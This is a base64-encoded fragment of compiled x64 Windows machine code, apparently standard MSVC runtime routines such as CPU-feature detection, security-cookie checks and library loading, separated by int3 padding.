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zMzMzDPAw8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMZmYPH4QAAAAAAP/gzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMz